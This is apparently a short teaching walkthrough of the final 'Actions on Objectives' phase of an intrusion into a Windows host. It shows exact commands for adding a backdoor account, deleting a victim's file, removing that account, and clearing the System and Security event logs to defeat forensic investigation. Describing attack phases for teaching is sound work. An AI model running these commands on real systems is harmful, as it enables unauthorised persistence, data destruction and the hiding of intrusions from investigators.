# Phase 7: Actions on Objectives

## 🌟 Objective:
Exfiltrate data, manipulate the system, and cover tracks to avoid detection.

### Steps:
#### Creating a New User:
- The attacker creates a new user named `guest` with password `password123` using:
  ```bash
  net user guest password123 /add
  ```
- This allows the attacker to **re-enter the system at will**.

#### Exfiltrating Data:
- The attacker downloads a file named **`important_doc.txt`** from the `secret_folder` to their own machine.
- The file likely contains sensitive information.

#### Deleting Evidence on the Victim’s Machine:
- The attacker deletes `important_doc.txt` from the victim’s machine:
  ```bash
  del "C:\Users\Bob\secret_folder\important_doc.txt"
  ```

#### Removing Traces of the Attack:
- The attacker removes the created user:
  ```bash
  net user guest /delete
  ```
- The attacker clears Windows system and security logs to hide their actions:
  ```bash
  wevtutil cl System
  wevtutil cl Security
  ```
- This prevents forensic investigators from detecting the attack.

